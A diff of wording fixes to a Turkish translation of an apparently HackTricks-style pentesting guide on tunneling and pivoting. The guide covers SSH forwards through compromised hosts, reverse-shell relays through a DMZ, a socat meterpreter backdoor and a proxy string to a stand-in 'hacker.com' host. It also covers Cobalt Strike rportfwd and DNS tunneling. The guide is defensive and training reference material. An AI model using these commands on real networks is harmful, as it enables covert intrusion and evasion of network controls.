@@ -5,7 +5,7 @@
 ## Nmap ipucu
 
 > [!WARNING]
-> **ICMP** ve **SYN** taramaları socks proxy'leri üzerinden tünellenemez, bu nedenle **ping keşfini devre dışı bırakmalıyız** (`-Pn`) ve bunun çalışması için **TCP taramalarını** (`-sT`) belirtmeliyiz.
+> **ICMP** ve **SYN** taramaları socks proxy'leri üzerinden tünellenemez, bu nedenle **ping keşfini devre dışı bırakmalıyız** (`-Pn`) ve bunun çalışması için **TCP taramaları** (`-sT`) belirtmeliyiz.
 
 ## **Bash**
 
@@ -31,7 +31,7 @@ SSH grafik bağlantısı (X)
 ```bash
 ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
 ```
-### Yerel Port2Port
+### Local Port2Port
 
 SSH Sunucusunda Yeni Port Aç --> Diğer port
 ```bash
@@ -43,7 +43,7 @@ ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in
 ```
 ### Port2Port
 
-Yerel port --> Ele geçirilmiş ana bilgisayar (SSH) --> Üçüncü_kutu:Port
+Yerel port --> Ele geçirilmiş host (SSH) --> Üçüncü_kutu:Port
 ```bash
 ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
 #Example
@@ -57,7 +57,7 @@ ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port
 ```
 ### Ters Port Yönlendirme
 
-Bu, DMZ üzerinden iç hostlardan kendi hostunuza ters shell almak için faydalıdır:
+Bu, iç hostlardan DMZ üzerinden kendi hostunuza ters shell almak için faydalıdır:
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
@@ -68,7 +68,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tüneli
 
-Her iki cihazda da **root'a ihtiyacınız var** (çünkü yeni arayüzler oluşturacaksınız) ve sshd yapılandırması root girişine izin vermelidir:\
+Her iki cihazda da **root erişimine** ihtiyacınız var (çünkü yeni arayüzler oluşturacaksınız) ve sshd yapılandırmasının root girişine izin vermesi gerekiyor:\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -78,7 +78,7 @@ ifconfig tun0 up #Activate the client side network interface
 ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
 ifconfig tun0 up #Activate the server side network interface
 ```
-Sunucu tarafında yönlendirmeyi etkinleştir.
+Sunucu tarafında yönlendirmeyi etkinleştir
 ```bash
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
@@ -104,7 +104,7 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ### Port2Port
 
-Yerel port --> Ele geçirilmiş ana bilgisayar (aktif oturum) --> Üçüncü_kutu:Port
+Yerel port --> Ele geçirilmiş host (aktif oturum) --> Üçüncü_kutu:Port
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
@@ -145,15 +145,15 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 > [!WARNING]
-> Bu durumda, **port beacon ana bilgisayarında açılır**, Team Server'da değil ve trafik Team Server'a gönderilir ve oradan belirtilen host:port'a iletilir.
+> Bu durumda, **port beacon host'ta açılır**, Team Server'da değil ve trafik Team Server'a gönderilir ve oradan belirtilen host:port'a iletilir.
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
 ```
-Not etmek gerekir:
+Not edilmesi gerekenler:
 
-- Beacon'ın ters port yönlendirmesi, **bireysel makineler arasında iletim için değil, Trafiği Team Server'a tünellemek için tasarlanmıştır**.
-- Trafik, **Beacon'ın C2 trafiği içinde tünellenir**, P2P bağlantıları dahil.
+- Beacon'ın ters port yönlendirmesi, **bireysel makineler arasında iletim için değil, Team Server'a trafik tünellemek için tasarlanmıştır**.
+- Trafik, **Beacon'ın C2 trafiği içinde tünellenir**, P2P bağlantıları da dahil.
 - Yüksek portlarda ters port yönlendirmeleri oluşturmak için **yönetici ayrıcalıkları gerekmez**.
 
 ### rPort2Port yerel
@@ -174,7 +174,7 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ```
 ## Chisel
 
-Bunu [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) adresindeki sürümler sayfasından indirebilirsiniz.\
+[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) adresinin sürümler sayfasından indirebilirsiniz.\
 **İstemci ve sunucu için aynı sürümü kullanmalısınız.**
 
 ### socks
@@ -276,7 +276,7 @@ socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
-### Meterpreter SSL Socat Üzerinden
+### Meterpreter üzerinden SSL Socat
 ```bash
 #Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
 attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
@@ -290,11 +290,13 @@ Bir **kimlik doğrulaması yapılmamış proxy**'yi, kurbanın konsolundaki son 
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
+[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
+
 ### SSL Socat Tüneli
 
 **/bin/sh konsolu**
 
-Her iki tarafta da sertifikalar oluşturun: İstemci ve Sunucu
+Her iki tarafta da: İstemci ve Sunucu için sertifikalar oluşturun
 ```bash
 # Execute these commands on both sides
 FILENAME=socatssl
@@ -352,13 +354,13 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Artık **`mstsc.exe`** kullanarak **RDP** üzerinden **kurban** ile **bağlanabiliriz** ve **SocksOverRDP eklentisinin etkin olduğu** ve **127.0.0.1:1080** adresinde **dinleyeceği** ile ilgili bir **istem** alacağız.
+Artık **`mstsc.exe`** kullanarak **RDP** üzerinden **kurban** ile **bağlanabiliriz** ve **SocksOverRDP eklentisinin etkin olduğu** belirten bir **istem** alacağız ve bu **127.0.0.1:1080** adresinde **dinleyecektir**.
 
 **RDP** üzerinden **bağlanın** ve kurban makinesine `SocksOverRDP-Server.exe` ikili dosyasını yükleyip çalıştırın:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
-Şimdi makinenizde (saldırgan) 1080 numaralı portun dinlendiğini doğrulayın:
+Şimdi makinenizde (saldırgan) 1080 numaralı portun dinlediğini doğrulayın:
 ```
 netstat -antb | findstr 1080
 ```
@@ -390,12 +392,12 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Şimdi, örneğin kurban üzerinde **SSH** hizmetini 443 numaralı portta dinleyecek şekilde ayarlarsanız. Saldırgan 2222 numaralı port üzerinden buna bağlanabilirsiniz.\
+Şimdi, örneğin kurbanın **SSH** hizmetini 443 numaralı portta dinleyecek şekilde ayarlarsanız. Saldırgan 2222 numaralı port üzerinden buna bağlanabilirsiniz.\
 Ayrıca, localhost:443'e bağlanan bir **meterpreter** kullanabilir ve saldırgan 2222 numaralı portta dinliyor olabilir.
 
 ## YARP
 
-Microsoft tarafından oluşturulan bir ters proxy. Bunu burada bulabilirsiniz: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
+Microsoft tarafından oluşturulmuş bir ters proxy. Bunu burada bulabilirsiniz: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
 
 ## DNS Tünelleme
 
@@ -409,7 +411,7 @@ attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
 victim> iodine -f -P P@ssw0rd tunneldomain.com -r
 #You can see the victim at 1.1.1.2
 ```
-Tünel çok yavaş olacaktır. Bu tünel üzerinden sıkıştırılmış bir SSH bağlantısı oluşturmak için:
+Tünel çok yavaş olacaktır. Bu tünel üzerinden sıkıştırılmış bir SSH bağlantısı oluşturmak için şunu kullanabilirsiniz:
 ```
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
@@ -440,7 +442,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Proxychains DNS'ini Değiştir
 
-Proxychains `gethostbyname` libc çağrısını keser ve tcp DNS isteğini socks proxy üzerinden tüneller. **Varsayılan** olarak proxychains'in kullandığı **DNS** sunucusu **4.2.2.2**'dir (hardcoded). Bunu değiştirmek için dosyayı düzenleyin: _/usr/lib/proxychains3/proxyresolv_ ve IP'yi değiştirin. **Windows ortamında** iseniz, **domain controller**'ın IP'sini ayarlayabilirsiniz.
+Proxychains, `gethostbyname` libc çağrısını keser ve tcp DNS isteğini socks proxy üzerinden tüneller. **Varsayılan** olarak proxychains'in kullandığı **DNS** sunucusu **4.2.2.2**'dir (hardcoded). Bunu değiştirmek için dosyayı düzenleyin: _/usr/lib/proxychains3/proxyresolv_ ve IP'yi değiştirin. **Windows ortamında** iseniz, **domain controller**'ın IP'sini ayarlayabilirsiniz.
 
 ## Go'da Tüneller
 
@@ -477,8 +479,8 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ```
 ## ngrok
 
-[**ngrok**](https://ngrok.com/) **çözümleri tek bir komut satırıyla internete açmak için bir araçtır.**\
-&#xNAN;_&#x45;xposition URI şunlar gibidir:_ **UID.ngrok.io**
+[**ngrok**](https://ngrok.com/) **bir komut satırı ile çözümleri internete açmak için bir araçtır.**\
+_&#x45;xposition URI'leri şunlar gibidir:_ **UID.ngrok.io**
 
 ### Kurulum
 
